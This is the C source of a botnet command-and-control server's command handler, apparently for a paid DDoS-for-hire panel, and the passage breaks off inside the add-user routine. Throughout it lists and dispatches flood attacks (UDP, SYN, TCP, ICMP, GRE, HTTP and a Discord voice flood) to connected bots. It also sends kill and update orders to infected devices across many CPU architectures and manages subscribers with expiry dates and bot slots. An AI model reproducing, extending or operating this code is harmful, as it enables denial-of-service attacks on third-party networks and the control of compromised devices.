#include "headers/command_handler.h"
#include "headers/botnet.h"
#include "headers/checks.h"
#include "headers/user_handler.h"
#include "headers/attack_commands.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <stdbool.h>
#include <ctype.h>
#include <time.h>

int validate_ip_or_subnet(const char *ip);
void handle_pps_command(const User *user, const char *command, char *response);
void handle_udpbypass_command(const User *user, const char *command, char *response);
void handle_discord_command(const User *user, const char *command, char *response);

void handle_openshell_command(const User *user, const char *command, int client_socket);
int is_rootuser(const char *username);
void sync_user_root_status(User *user);

static char response_buf[MAX_COMMAND_LENGTH];
static char arch_cmd_buf[512];
static int valid_bot_count = 0;

void handle_bots_command(char *response);
void handle_clear_command(char *response);
void handle_stats_command(char *response);
void handle_stopall_command(const User *user, char *response);
void handle_update_command(const User *user, int client_socket, char *response);
void handle_user_command(const User *user, const char *command, char *response);
void handle_users_list_command(const User *caller, int client_socket);
void handle_adduser_command(const User *user, int client_socket);
void handle_removeuser_command(const User *user, const char *command, char *response);
void handle_kickuser_command(const User *user, const char *command, char *response);
void handle_admin_command(const User *user, char *response);
void handle_ping_command(char *response);
void handle_selfrep_command(const User *user, const char *command, char *response, const char *scanner_type, const char *action, const char *sarch);
void handle_adddays_command(const User *user, const char *command, char *response);
void handle_maxslots_command(const User *user, const char *command, char *response);

/*
H E L P   C O M M A N D
*/
int is_rootuser(const char *username) {
    FILE *sf = fopen("options/settings.txt", "r");
    if (!sf) return 0;
    
    int is_root = 0;
    char line[256];
    while (fgets(line, sizeof(line), sf)) {
        if (strncmp(line, "rootuser:", 9) == 0) {
            char *rootusers = line + 9;
            while (*rootusers == ' ') rootusers++;
            
            char *root_copy = malloc(strlen(rootusers) + 1);
            strcpy(root_copy, rootusers);
            char *saveptr;
            char *token = strtok_r(root_copy, ",", &saveptr);
            while (token) {
                while (*token == ' ') token++;
                char *end = token + strlen(token) - 1;
                while (end > token && (*end == ' ' || *end == '\n' || *end == '\r')) {
                    *end = '\0';
                    end--;
                }
                if (strcmp(username, token) == 0) {
                    is_root = 1;
                    free(root_copy);
                    fclose(sf);
                    return is_root;
                }
                token = strtok_r(NULL, ",", &saveptr);
            }
            free(root_copy);
            break;
        }
    }
    fclose(sf);
    return is_root;
}

void sync_user_root_status(User *user) {
    if (!user) return;
    user->is_root = is_rootuser(user->user);
    if (user->is_root) {
        user->is_admin = 1;
    }
}

void handle_help_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             "\033[2J\033[H"
             LIGHT_BLUE " [General]\r\n" RESET
             "  help     " GRAY "- " RESET "show this help\r\n"
             "  methods  " GRAY "- " RESET "list attack methods\r\n"
             "  options  " GRAY "- " RESET "list attack options\r\n"
             "  bots     " GRAY "- " RESET "show connected bots\r\n"
             "  stats    " GRAY "- " RESET "show uptime, bots, users, cooldown\r\n"
             "  user     " GRAY "- " RESET "show your account info + expiry\r\n"
             "  users list " GRAY "- " RESET "list all users (admin only)\r\n"
             "  clear    " GRAY "- " RESET "clear screen\r\n"
             "  stopall  " GRAY "- " RESET "stop all running attacks\r\n"
             "  exit     " GRAY "- " RESET "disconnect\r\n"
             "\r\n"
             LIGHT_BLUE " [Admin]\r\n" RESET
             "  admin    " GRAY "- " RESET "show admin commands\r\n"
             "\r\n" RESET);
}

/*
 * METHODS   C O M M A N D  (Manji style)
 */
void handle_methods_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             "\033[H\033[2J"
             "\033[97m[\033[0m" LIGHT_BLUE "Layer4" "\033[97m]\033[0m\r\n"
             "\033[97m║\033[0m " LIGHT_BLUE "udp         " RESET "USER DATAGRAM PROTOCOL, high lenght flood.\r\n"
             "\033[97m║\033[0m " LIGHT_BLUE "udpplain    " RESET "UDP plain flood, high PPS.\r\n"
             "\033[97m║\033[0m " LIGHT_BLUE "udpbypass   " RESET "USER DATAGRAM PROTOCOL, randomized payloads.\r\n"
             "\033[97m║\033[0m " LIGHT_BLUE "discord     " RESET "Discord Static RTC Voice Data flood.\r\n"
             "\033[97m║\033[0m " LIGHT_BLUE "pps         " RESET "USER DATAGRAM PROTOCOL, low lenght flood.\r\n"
             "\033[97m║\033[0m " LIGHT_BLUE "syn         " RESET "TCP Legitimate Syn connections, low lenght flood.\r\n"
             "\033[97m║\033[0m " LIGHT_BLUE "tcp         " RESET "TCP socket flood.\r\n"
             "\033[97m║\033[0m " LIGHT_BLUE "icmp        " RESET "Internet Control Message Protocol flood.\r\n"
             "\033[97m║\033[0m " LIGHT_BLUE "gre         " RESET "Generic Routing Encapsulation over IP flood.\r\n"
             "\r\n"
             "\033[97m[\033[0m" LIGHT_BLUE "Layer7" "\033[97m]\033[0m\r\n"
             "\033[97m║\033[0m " LIGHT_BLUE "http        " RESET "HTTP/1.1 Generic GET/POST high RPS flood.\r\n"
             "\r\n"
             RESET);
}


/*
OPTIONS   C O M M A N D
*/
void handle_opthelp_command(char *response) {
    pthread_mutex_lock(&g_maxslots_mutex);
    int cur_slots = g_maxslots;
    pthread_mutex_unlock(&g_maxslots_mutex);

    snprintf(response, MAX_COMMAND_LENGTH,
             "\r\n"
             LIGHT_BLUE " [" RESET "Attack Options" LIGHT_BLUE "]\r\n"
             LIGHT_BLUE " ║ " RESET "len=N        " GRAY "- " RESET "Packet size (1-1500), e.g. len=512 or len=100-1400\r\n"
             LIGHT_BLUE " ║ " RESET "sarch=ARCH   " GRAY "- " RESET "Only use bots of this arch (e.g. sarch=x86_64)\r\n"
             LIGHT_BLUE " ║ " RESET "cons=N       " GRAY "- " RESET "Use N/%d of bots (slots, admin sets max via maxslots)\r\n"
             LIGHT_BLUE " ║ " RESET "srcport=N    " GRAY "- " RESET "Source port for SYN (default: random)\r\n"
             LIGHT_BLUE " ║ " RESET "usleep=N     " GRAY "- " RESET "Delay between packets in microseconds\r\n"
             "\r\n" RESET,
             cur_slots);
}

void process_command(const User *user, const char *command, int client_socket, const char *user_ip) {
    if (strlen(command) == 0) return;

    log_command(user->user, user_ip, command);

    if (is_attack_command(command)) {
        pthread_mutex_lock(&cooldown_mutex);
        if (global_cooldown > 0) {
            snprintf(response_buf, sizeof(response_buf), RESET "\rGlobal cooldown still active for " YELLOW "%d seconds" RESET "\n", global_cooldown);
            pthread_mutex_unlock(&cooldown_mutex);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        pthread_mutex_unlock(&cooldown_mutex);
    }

    if (strncmp(command, "kill", 4) == 0) {
        if (!user->is_admin) {
            snprintf(response_buf, sizeof(response_buf), RED "Only admins can use kill command\n" RESET);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        char sarch[32] = {0};
        char bot_ip[64] = {0};
        int has_sarch = 0, has_botip = 0, unknown_arg = 0;
        if (strlen(command) > 4) {
            char *args = (char *)(command + 4);
            while (*args == ' ') args++;
            char *token = strtok(args, " ");
            while (token) {
                if (strncmp(token, "sarch=", 6) == 0) {
                    strncpy(sarch, token + 6, sizeof(sarch) - 1);
                    sarch[sizeof(sarch) - 1] = 0;
                    has_sarch = 1;
                } else if (strncmp(token, "bot=", 4) == 0) {
                    strncpy(bot_ip, token + 4, sizeof(bot_ip) - 1);
                    bot_ip[sizeof(bot_ip) - 1] = 0;
                    has_botip = 1;
                } else if (strlen(token) > 0) {
                    unknown_arg = 1;
                }
                token = strtok(NULL, " ");
            }
        }
        if (unknown_arg) {
            snprintf(response_buf, sizeof(response_buf), RED "Unknown argument for !kill. only sarch=, bot=x.x.x.x allowed\n" RESET);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        static const char* known_archs[] = {"arc", "powerpc", "sh4", "mips", "mipsel", "x86_64", "m68k", "sparc", "i486", "aarch64", "armv4l", "armv5l", "armv6l", "armv7l"};
        if (has_sarch) {
            int valid_arch = 0;
            for (size_t k = 0; k < sizeof(known_archs)/sizeof(known_archs[0]); k++) {
                if (strcmp(sarch, known_archs[k]) == 0) { valid_arch = 1; break; }
            }
            if (!valid_arch) {
                snprintf(response_buf, sizeof(response_buf), RED "Invalid arch for sarch=\n" RESET);
                send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
                return;
            }
        }
        pthread_mutex_lock(&bot_mutex);
        int sent_bots = 0;
        for (int i = 0; i < bot_count; i++) {
            if (!bots[i].is_valid) continue;
            int arch_match = 1;
            int ip_match = 1;
            if (has_sarch) {
                arch_match = 0;
                char *saveptr1;
                char sarch_copy[128];
                strncpy(sarch_copy, sarch, sizeof(sarch_copy)-1);
                sarch_copy[sizeof(sarch_copy)-1] = 0;
                char *tok = strtok_r(sarch_copy, ",", &saveptr1);
                while (tok) {
                    if (strcmp(tok, bots[i].arch) == 0) { arch_match = 1; break; }
                    tok = strtok_r(NULL, ",", &saveptr1);
                }
                if (!arch_match) continue;
            }
            if (has_botip) {
                char ipstr[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &bots[i].address.sin_addr, ipstr, sizeof(ipstr));
                if (strcmp(ipstr, bot_ip) != 0) continue;
            }
            sent_bots++;
        }
        pthread_mutex_unlock(&bot_mutex);
        if (sent_bots == 0) {
            snprintf(response_buf, sizeof(response_buf), RED "\rNo matching bots found\n" RESET);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        char confirm_msg[128];
        snprintf(confirm_msg, sizeof(confirm_msg), YELLOW "\rAre you sure you want to kill %d bots? Y to proceed: " RESET, sent_bots);
        send(client_socket, confirm_msg, strlen(confirm_msg), MSG_NOSIGNAL);
        
        char confirm_buf[8] = {0};
        ssize_t confirm_len = recv(client_socket, confirm_buf, sizeof(confirm_buf)-1, 0);
        
        int confirmed = 0;
        if (confirm_len > 0) {
            for (int i = 0; i < confirm_len; i++) {
                if (confirm_buf[i] == 'Y' || confirm_buf[i] == 'y') {
                    confirmed = 1;
                    break;
                }
            }
        }
        
        if (!confirmed) {
            snprintf(response_buf, sizeof(response_buf), RED "\rAborted. No bots killed\r\n" RESET);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        /* Collect matching fds, mark them dead, then send !kill + close OUTSIDE the
           mutex.  Old code used O(n) struct-copy shift inside the lock — same
           pthread_mutex_t copy UB as was fixed in sweep_invalid_bots. */
        int kill_fds[1024];
        int kill_count = 0;

        pthread_mutex_lock(&bot_mutex);
        for (int i = 0; i < bot_count; i++) {
            if (!bots[i].is_valid || bots[i].socket <= 0) continue;

            int arch_match = 1;
            if (has_sarch) {
                arch_match = 0;
                char *saveptr1;
                char sarch_copy[128];
                strncpy(sarch_copy, sarch, sizeof(sarch_copy)-1);
                sarch_copy[sizeof(sarch_copy)-1] = 0;
                char *tok = strtok_r(sarch_copy, ",", &saveptr1);
                while (tok) {
                    if (strcmp(tok, bots[i].arch) == 0) { arch_match = 1; break; }
                    tok = strtok_r(NULL, ",", &saveptr1);
                }
            }
            if (!arch_match) continue;

            if (has_botip) {
                char ipstr[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &bots[i].address.sin_addr, ipstr, sizeof(ipstr));
                if (strcmp(ipstr, bot_ip) != 0) continue;
            }

            /* Take ownership of the fd, zero it in-slot, mark invalid.
               sweep_invalid_bots() will compact the array on the next periodic run. */
            if (kill_count < 1024) kill_fds[kill_count++] = bots[i].socket;
            bots[i].socket   = -1;
            bots[i].is_valid = 0;
        }
        pthread_mutex_unlock(&bot_mutex);

        /* Send !kill and close each fd outside the lock — we own them now. */
        for (int k = 0; k < kill_count; k++) {
            send(kill_fds[k], "!kill", 5, MSG_NOSIGNAL);
            shutdown(kill_fds[k], SHUT_RDWR);
            close(kill_fds[k]);
        }

        snprintf(response_buf, sizeof(response_buf),
                 GREEN "Terminated %d bots\r\n" RESET, kill_count);
        send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
        return;
    }

    if (strcmp(command, "help") == 0) {
        handle_help_command(response_buf);
    } else if (strcmp(command, "admin") == 0) {
        handle_admin_command(user, response_buf);
    } else if (strcmp(command, "methods") == 0) {
        handle_methods_command(response_buf);
    } else if (strcmp(command, "bots") == 0) {
        handle_bots_command(response_buf);
    } else if (strcmp(command, "stats") == 0) {
        handle_stats_command(response_buf);
    } else if (strcmp(command, "ping") == 0) {
        handle_ping_command(response_buf);
    } else if (strcmp(command, "clear") == 0 || strcmp(command, "cls") == 0 || strcmp(command, "home") == 0) {
        send_motd(user, user_ip, client_socket);
        return;
    } else if (strcmp(command, "options") == 0) {
        handle_opthelp_command(response_buf);
    } else if (strcmp(command, "exit") == 0 || strcmp(command, "quit") == 0) {
        snprintf(response_buf, sizeof(response_buf), YELLOW "\rGoodbye!\n" RESET);
        send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
        close(client_socket);
        return;
    } else if (strcmp(command, "users list") == 0 || strcmp(command, "users") == 0) {
        handle_users_list_command(user, client_socket);
        return;
    } else if (strncmp(command, "user", 4) == 0) {
        handle_user_command(user, command, response_buf);
    } else if (strcmp(command, "adduser") == 0) {
        handle_adduser_command(user, client_socket);
        return;
    } else if (strncmp(command, "adddays", 7) == 0) {
        handle_adddays_command(user, command, response_buf);
    } else if (strncmp(command, "maxslots", 8) == 0) {
        handle_maxslots_command(user, command, response_buf);
    } else if (strncmp(command, "removeuser", 10) == 0) {
        handle_removeuser_command(user, command, response_buf);
    } else if (strncmp(command, "kickuser", 8) == 0) {
        handle_kickuser_command(user, command, response_buf);
    } else if (strncmp(command, "udpplain", 8) == 0) {
        handle_udpplain_command(user, command, response_buf);
    } else if (strncmp(command, "pps", 3) == 0) {
        handle_pps_command(user, command, response_buf);
    } else if (strncmp(command, "udpbypass", 9) == 0) {
        handle_udpbypass_command(user, command, response_buf);
    } else if (strncmp(command, "discord", 7) == 0) {
        handle_discord_command(user, command, response_buf);
    } else if (strncmp(command, "udp", 3) == 0) {
        handle_udp_command(user, command, response_buf);
    } else if (strncmp(command, "syn", 3) == 0) {
        handle_syn_command(user, command, response_buf);
    } else if (strncmp(command, "tcp", 3) == 0) {
        handle_tcp_command(user, command, response_buf);
    } else if (strncmp(command, "http", 4) == 0) {
        handle_http_command(user, command, response_buf);
    } else if (strncmp(command, "icmp", 4) == 0) {
        handle_icmp_command(user, command, response_buf);
    } else if (strncmp(command, "gre", 3) == 0) {
        handle_gre_command(user, command, response_buf);
    } else if (strcmp(command, "stopall") == 0) {
        handle_stopall_command(user, response_buf);
    } else if (strcmp(command, "update") == 0) {
        handle_update_command(user, client_socket, response_buf);
    } else {
        snprintf(response_buf, sizeof(response_buf), RESET "\rUnknown command. Type " LIGHT_BLUE "help" RESET " for a list of commands.\n" RESET);
    }

    send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
}

void handle_bots_command(char *response) {
    /* Old code had an O(n²) IP-dedup inner loop — at 50k bots that's 2.5 billion
       iterations every time someone types "bots".  Removed.  We now show the real
       connected-socket count, which is the only number that matters operationally. */
    #define NUM_ARCHS 15
    static const char *arch_names[NUM_ARCHS] = {
        "x86_64", "aarch64", "armv7l", "armv6l", "armv5l", "armv4l",
        "mips", "mipsel", "i486", "powerpc", "sh4", "m68k",
        "sparc", "arc", "unknown"
    };
    int arch_count[NUM_ARCHS];
    int total = 0;
    memset(arch_count, 0, sizeof(arch_count));

    pthread_mutex_lock(&bot_mutex);
    int safe = bot_count < MAX_BOTS ? bot_count : MAX_BOTS;
    for (int i = 0; i < safe; i++) {
        if (!bots[i].is_valid || bots[i].socket <= 0) continue;
        total++;
        int found = 0;
        for (int j = 0; j < NUM_ARCHS - 1 && !found; j++) {
            if (strcmp(bots[i].arch, arch_names[j]) == 0) {
                arch_count[j]++;
                found = 1;
            }
        }
        if (!found) arch_count[NUM_ARCHS - 1]++;
    }
    pthread_mutex_unlock(&bot_mutex);

    int off = snprintf(response, MAX_COMMAND_LENGTH,
                       YELLOW "Bots: " RESET "%d\r\n", total);
    for (int i = 0; i < NUM_ARCHS; i++) {
        if (arch_count[i] <= 0) continue;
        if (off >= MAX_COMMAND_LENGTH - 64) break;
        off += snprintf(response + off, MAX_COMMAND_LENGTH - off,
                        LIGHT_BLUE "  %-10s " RESET "%d\r\n",
                        arch_names[i], arch_count[i]);
    }
    #undef NUM_ARCHS
}

void handle_clear_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH, "\033[2J\033[H");
}

void handle_stats_command(char *response) {
    /* Uptime */
    time_t now    = time(NULL);
    time_t uptime = now - g_start_time;
    int udays  = (int)(uptime / 86400);
    int uhours = (int)((uptime % 86400) / 3600);
    int umins  = (int)((uptime % 3600)  / 60);

    /* Bot count */
    int total_bots = 0;
    pthread_mutex_lock(&bot_mutex);
    int safe = bot_count < MAX_BOTS ? bot_count : MAX_BOTS;
    for (int i = 0; i < safe; i++)
        if (bots[i].is_valid && bots[i].socket > 0) total_bots++;
    pthread_mutex_unlock(&bot_mutex);

    /* Users online */
    extern int user_sockets[MAX_USERS];
    int users_online = 0;
    for (int i = 0; i < MAX_USERS; i++)
        if (user_sockets[i] > 0) users_online++;

    /* Cooldown */
    pthread_mutex_lock(&cooldown_mutex);
    int cd = global_cooldown;
    pthread_mutex_unlock(&cooldown_mutex);

    snprintf(response, MAX_COMMAND_LENGTH,
             "\r\n"
             LIGHT_BLUE " [" RESET "Hard Raw stats" LIGHT_BLUE "]\r\n"
             LIGHT_BLUE " ║ " RESET "Uptime:    " YELLOW "%dd %dh %dm" RESET "\r\n"
             LIGHT_BLUE " ║ " RESET "Bots:      " YELLOW "%d" RESET "\r\n"
             LIGHT_BLUE " ║ " RESET "Users:     " YELLOW "%d / %d" RESET "\r\n"
             LIGHT_BLUE " ║ " RESET "Cooldown:  " YELLOW "%ds" RESET "\r\n"
             LIGHT_BLUE " ║ " RESET "Capacity:  " YELLOW "%d slots" RESET "\r\n"
             "\r\n",
             udays, uhours, umins,
             total_bots,
             users_online, MAX_USERS,
             cd,
             MAX_BOTS);
}




void handle_stopall_command(const User *user, char *response) {
    /* Was using static vars — shared across all concurrent CNC sessions → race condition. Fixed. */
    int allow_stopall = 0;
    int stopped_count = 0;
    static const char stop_cmd[] = "stop";

    if (user->is_admin) {
        allow_stopall = 1;
    } else {
        FILE* sf = fopen("options/settings.txt", "r");
        if (sf) {
            char line[128] = {0};
            while (fgets(line, sizeof(line), sf)) {
                if (strncmp(line, "globalstopall:", 13) == 0) {
                    allow_stopall = strstr(line, "yes") ? 1 : 0;
                    break;
                }
            }
            fclose(sf);
        }
    }

    if (!allow_stopall) {
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Error: You don't have permission to use stopall\n" RESET);
        return;
    }

    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].is_valid && bots[i].socket > 0) {
            if (send(bots[i].socket, stop_cmd, strlen(stop_cmd), MSG_NOSIGNAL) > 0)
                stopped_count++;
        }
    }
    pthread_mutex_unlock(&bot_mutex);

    pthread_mutex_lock(&cooldown_mutex);
    global_cooldown = 0;
    pthread_mutex_unlock(&cooldown_mutex);

    snprintf(response, MAX_COMMAND_LENGTH,
             RESET "Attack stopped on " YELLOW "%d" RESET " bots.\n", stopped_count);
}

void handle_update_command(const User *user, int client_socket, char *response) {
    if (!user->is_admin) {
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Error: Only admins can use !update\n" RESET);
        return;
    }

    int sent = 0;
    static const char update_cmd[] = "!update";

    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].is_valid && bots[i].socket > 0) {
            if (send(bots[i].socket, update_cmd, strlen(update_cmd), MSG_NOSIGNAL) > 0)
                sent++;
        }
    }
    pthread_mutex_unlock(&bot_mutex);

    snprintf(response, MAX_COMMAND_LENGTH,
             "\033[0mUpdate sent!\033[38;2;0;85;255m.\033[0m\n");
}

/* ── users list ─────────────────────────────────────────────────────────
 * Admin/root only. Sends a formatted table of all users directly to the
 * socket so we bypass the 4096-byte response_buf limit.
 * ──────────────────────────────────────────────────────────────────────── */
void handle_users_list_command(const User *caller, int client_socket) {
    if (!caller->is_admin && !caller->is_root) {
        const char *deny = RED "Access denied. Admins only.\r\n" RESET;
        send(client_socket, deny, strlen(deny), MSG_NOSIGNAL);
        return;
    }

    time_t now = time(NULL);

    /* Header */
    const char *header =
        "\r\n"
        LIGHT_BLUE " #   Username          Time    Concs   CD   Expiry          Perms\r\n" RESET
        GRAY       " --  ---------------   ------  ------  ---  --------------  -----\r\n" RESET;
    send(client_socket, header, strlen(header), MSG_NOSIGNAL);

    for (int i = 0; i < user_count; i++) {
        /* ── Expiry field ── */
        char expiry_buf[24];
        const char *expiry_color;
        if (users[i].expire_time == 0) {
            snprintf(expiry_buf, sizeof(expiry_buf), "Never");
            expiry_color = GREEN;
        } else {
            long long rem = (long long)users[i].expire_time - (long long)now;
            if (rem <= 0) {
                snprintf(expiry_buf, sizeof(expiry_buf), "EXPIRED");
                expiry_color = RED;
            } else {
                long days  = (long)(rem / 86400);
                int  hours = (int)((rem % 86400) / 3600);
                snprintf(expiry_buf, sizeof(expiry_buf), "%ldd %dh", days, hours);
                expiry_color = (days < 3) ? YELLOW : RESET;
            }
        }

        /* ── Perms boxes ── */
        char perms[128] = "";
        if (users[i].is_admin)
            strcat(perms, "\033[43;30m A \033[0m");
        else
            strcat(perms, "   ");
        if (users[i].is_root)
            strcat(perms, " \033[42;30m V \033[0m");

        /* ── Build row ──
         * dot (~13 B) and perms (~60 B) contain ANSI codes; GCC can't prove
         * their bounds at compile time and emits a false Wformat-truncation.
         * The actual max output is well under 1024 bytes. */
        char row[1024];
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wformat-truncation"
        snprintf(row, sizeof(row),
            " %-3d  %-16s  %-6d  %-6d  %-3d  %s%-14s\033[0m  %s\r\n",
            i + 1,
            users[i].user,
            users[i].maxtime,
            users[i].maxbots,
            0,              /* CD — no per-user cooldown field */
            expiry_color,
            expiry_buf,
            perms
        );
#pragma GCC diagnostic pop
        send(client_socket, row, strlen(row), MSG_NOSIGNAL);
    }

    /* Footer */
    char footer[128];
    snprintf(footer, sizeof(footer),
        "\r\n" GRAY " %d user(s) total\r\n" RESET, user_count);
    send(client_socket, footer, strlen(footer), MSG_NOSIGNAL);
}

void handle_user_command(const User *user, const char *command, char *response) {
    if (!user->is_admin) {
        FILE *sf = fopen("options/settings.txt", "r");
        int allow_non_admin = 0;
        if (sf) {
            char line[128];
            while (fgets(line, sizeof(line), sf)) {
                if (strncmp(line, "globalusercommand:", 17) == 0 && strstr(line, "yes")) {
                    allow_non_admin = 1;
                    break;
                }
            }
            fclose(sf);
        }
        if (!allow_non_admin) {
            snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "\ronly admins can use !user command\r\n" RESET);
            return;
        }
    }
    
    /* Helper: format expiry_time into a human-readable string. */
    #define FMT_EXPIRY(buf, sz, t) do {                                     \
        if ((t) == 0) {                                                     \
            strncpy((buf), "Never", (sz));                                  \
        } else {                                                            \
            time_t _now = time(NULL);                                       \
            long long _rem = (long long)(t) - (long long)_now;             \
            struct tm _tm; localtime_r(&(t), &_tm);                         \
            char _date[32]; strftime(_date, sizeof(_date),                  \
                                     "%Y-%m-%d %H:%M", &_tm);               \
            if (_rem <= 0) {                                                \
                snprintf((buf), (sz), RED "EXPIRED" RESET " (%s)", _date); \
            } else {                                                        \
                int _d = (int)(_rem / 86400);                               \
                int _h = (int)((_rem % 86400) / 3600);                     \
                snprintf((buf), (sz), "%s (%dd %dh left)", _date, _d, _h); \
            }                                                               \
        }                                                                   \
    } while (0)

    char target_user[50] = {0};
    if (sscanf(command, "user %49s", target_user) == 1) {
        int found = 0;
        for (int i = 0; i < user_count; i++) {
            if (strcmp(users[i].user, target_user) == 0) {
                int is_connected = (user_sockets[i] > 0) ? 1 : 0;
                char expiry_str[96];
                FMT_EXPIRY(expiry_str, sizeof(expiry_str), users[i].expire_time);
                snprintf(response, MAX_COMMAND_LENGTH,
                    LIGHT_BLUE "Username:  " RESET "%s\r\n"
                    LIGHT_BLUE "Max time:  " RESET "%d\r\n"
                    LIGHT_BLUE "Max bots:  " RESET "%d\r\n"
                    LIGHT_BLUE "Root:      " RESET "%s\r\n"
                    LIGHT_BLUE "Admin:     " RESET "%s\r\n"
                    LIGHT_BLUE "Expires:   " RESET "%s\r\n"
                    LIGHT_BLUE "Online:    " RESET "%s\r\n",
                    users[i].user,
                    users[i].maxtime,
                    users[i].maxbots,
                    users[i].is_root  ? "yes" : "no",
                    users[i].is_admin ? "yes" : "no",
                    expiry_str,
                    is_connected ? "yes" : "no");
                found = 1;
                break;
            }
        }
        if (!found)
            snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "User not found\r\n" RESET);
    } else {
        char expiry_str[96];
        FMT_EXPIRY(expiry_str, sizeof(expiry_str), user->expire_time);
        snprintf(response, MAX_COMMAND_LENGTH,
            LIGHT_BLUE "Username:  " RESET "%s\r\n"
            LIGHT_BLUE "Max time:  " RESET "%d\r\n"
            LIGHT_BLUE "Max bots:  " RESET "%d\r\n"
            LIGHT_BLUE "Root:      " RESET "%s\r\n"
            LIGHT_BLUE "Admin:     " RESET "%s\r\n"
            LIGHT_BLUE "Expires:   " RESET "%s\r\n"
            LIGHT_BLUE "Online:    " RESET "yes\r\n",
            user->user,
            user->maxtime,
            user->maxbots,
            user->is_root  ? "yes" : "no",
            user->is_admin ? "yes" : "no",
            expiry_str);
    }
    #undef FMT_EXPIRY
}


void handle_adduser_command(const User *user, int client_socket) {
    /* Was using static vars — handle_adduser runs inside handle_client threads.
       Two concurrent adduser sessions would corrupt each other's state. Fixed. */
    char response[MAX_COMMAND_LENGTH];
    char buffer[128];
    char newuser[50];
    char newpass[50];
    char tmp[256];
    int maxtime = 0, maxbots = 0, is_admin = 0;
    ssize_t len;
    memset(newuser, 0, sizeof(newuser));
    memset(newpass, 0, sizeof(newpass));
    
    if (!is_rootuser(user->user)) {
        snprintf(response, sizeof(response), LIGHT_BLUE "Only root user can add users\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    snprintf(response, sizeof(response), CYAN "\rUsername: " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    int uidx = 0;
    memset(buffer, 0, sizeof(buffer));
    while (1) {
        len = recv(client_socket, buffer + uidx, sizeof(buffer) - 1 - uidx, 0);
        if (len <= 0) return;
        int found = 0;
        for (int i = uidx; i < uidx + len; i++) {
            if (buffer[i] == '\r' || buffer[i] == '\n') {
                buffer[i] = 0;
                found = 1;
                break;
            }
        }
        uidx += len;
        if (found) break;
        if (uidx >= (int)sizeof(buffer) - 1) return;
    }
    while (recv(client_socket, &tmp, 1, MSG_DONTWAIT | MSG_PEEK) > 0) {
        recv(client_socket, &tmp, 1, MSG_DONTWAIT);
    }
    uidx = 0;
    for (int i = 0; buffer[i] && uidx < 49; i++) {
        char c = buffer[i];
        if (c == '\r' || c == '\n') break;
        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '_') {
            newuser[uidx++] = c;
        }
    }
    newuser[uidx] = 0;
    if (strlen(newuser) < 3) {
        snprintf(response, sizeof(response), LIGHT_BLUE "\r\nUsername must be at least 3 characters\r\n\r\n" CYAN "Username: " RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    for (int i = 0; i < user_count; i++) {
        if (strcmp(users[i].user, newuser) == 0) {
            snprintf(response, sizeof(response), LIGHT_BLUE "\r\nUser already exists\r\n\r\n" CYAN "Username: " RESET);
            send(client_socket, response, strlen(response), MSG_NOSIGNAL);
            return;
        }
    }
    snprintf(response, sizeof(response), CYAN "\rPassword: " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    int pidx = 0;
    memset(buffer, 0, sizeof(buffer));
    while (1) {
        len = recv(client_socket, buffer + pidx, sizeof(buffer) - 1 - pidx, 0);
        if (len <= 0) return;
        int found = 0;
        for (int i = pidx; i < pidx + len; i++) {
            if (buffer[i] == '\n' || buffer[i] == '\r') {
                buffer[i] = 0;
                found = 1;
                break;
            }
        }
        pidx += len;
        if (found) break;
        if (pidx >= (int)sizeof(buffer) - 1) return;
    }
    while (recv(client_socket, &tmp, 1, MSG_DONTWAIT | MSG_PEEK) > 0) {
        recv(client_socket, &tmp, 1, MSG_DONTWAIT);
    }
    pidx = 0;
    for (int i = 0; buffer[i] && pidx < 49; i++) {
        char c = buffer[i];
        if (c == '\r' || c == '\n') break;
        if (c >= 32 && c <= 126) {
            newpass[pidx++] = c;
        }
    }
    newpass[pidx] = 0;
    if (strlen(newpass) < 4) {
        snprintf(response, sizeof(response), LIGHT_BLUE "\rPassword must be at least 4 characters\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    snprintf(response, sizeof(response), CYAN "\rAdmin? (y/n): " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    int adminidx = 0;
    memset(buffer, 0, sizeof(buffer));
    is_admin = 0;
    while (1) {
        len = recv(client_socket, buffer + adminidx, sizeof(buffer) - 1 - adminidx, 0);
        if (len <= 0) return;
        int found = 0;
        for (int i = adminidx; i < adminidx + len; i++) {
            char c = buffer[i];
            if (c == 'y' || c == 'Y') {
                is_admin = 1;
                found = 1;
                break;
            } else if (c == 'n' || c == 'N') {
                is_admin = 0;
                found = 1;
                break;
            } else if (c < 32 || c == 127) {
                found = 1;
                break;
            }
        }
        adminidx += len;
        if (found) break;
        if (adminidx >= (int)sizeof(buffer) - 1) return;
    }
